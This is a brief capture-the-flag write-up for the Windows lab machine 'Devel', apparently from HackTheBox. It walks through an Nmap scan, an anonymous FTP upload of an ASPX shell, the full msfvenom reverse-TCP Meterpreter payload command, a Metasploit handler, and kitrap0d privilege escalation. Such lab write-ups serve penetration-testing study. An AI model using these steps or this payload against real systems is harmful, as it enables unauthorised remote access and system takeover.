# Devel - Machine

> [!note]
> IP 10.10.10.5
> Windows Easy

## Contents
- [Tools](#tools)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Priviledge Escalation](#priviledge-escalation)

## Tools

- Nmap
- ftp
- Metasploit

## Enumeration

- Nmap shows port 21 and 80 is open.

## Exploitation

- FTP anynymous login was enabled. So, exploited it with `put shell.aspx` to upload msfvenom shell.
msfvenom command used,
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LAB IP> LPORT=<PORT> -f aspx > shell.aspx`
- Then used `/multi/handler` to get reverse tcp connection from the shell on metasploit as user `IIS APPPOOL\Web`.

## Priviledge Escalation

- Used `local_exploit_suggester` module for this.
- After trying some suggested exploit `exploit/windows/local/ms10_015_kitrap0d` worked. The flags can now be obtained from
`c:\Users\babis\Desktop\user.txt.txt​` and `c​:\Users\Administrator\Desktop\root.txt.txt`

Author: [Zishan Ahamed Thandar](https://ZishanAdThandar.github.io)
